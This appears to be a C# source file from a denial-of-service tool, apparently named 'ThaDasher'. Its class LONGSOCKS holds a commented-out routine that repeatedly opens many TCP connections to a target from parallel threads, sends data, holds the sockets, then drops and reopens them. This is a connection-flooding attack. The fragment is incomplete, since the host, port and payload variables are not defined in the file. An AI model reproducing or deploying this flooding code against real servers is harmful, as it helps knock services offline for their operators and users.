
//
// Author: Dashie
// Version: 1.0
//

using System;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

namespace ThaDasher
{
    public class LONGSOCKS
    {
	public static void Launch()
	{
	    // - Universal Get() method to obtain host values and stuff.
	    // -
	    // -

	    /*DashNet.workers.Add(
		new Thread(() =>
		{
		    while (true)
		    {
			List<Socket> socks = new List<Socket>();

			for (int k = 0; k < 8; k += 1)
			{
			    new Thread(() =>
			    {
				for (int d = 0; d < 6; d += 1)
				{
				    var sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				    var resu = sock.BeginConnect(host, port, null, null);
				    var succ = resu.AsyncWaitHandle.WaitOne(400, true);

				    //sock.Blocking = true;

				    if (sock.Connected)
				    {
					sock.Send(data, SocketFlags.None);
					connections += 1;

					// Successful Connection -= 1;
				    }

				    else
				    {
					// Dropped Connection += 1;
				    }

				    socks.Add(sock);
				};
			    })

			    { IsBackground = true }.Start();
			};

			Thread.Sleep(5000);

			foreach (var sock in socks)
			{
			    if (sock.Connected)
			    {
				sock.Disconnect(true);
			    };

			    sock.Close();
			};

			socks.Clear();
		    };
		})

		{ IsBackground = true }
	    );*/
	}
    }
}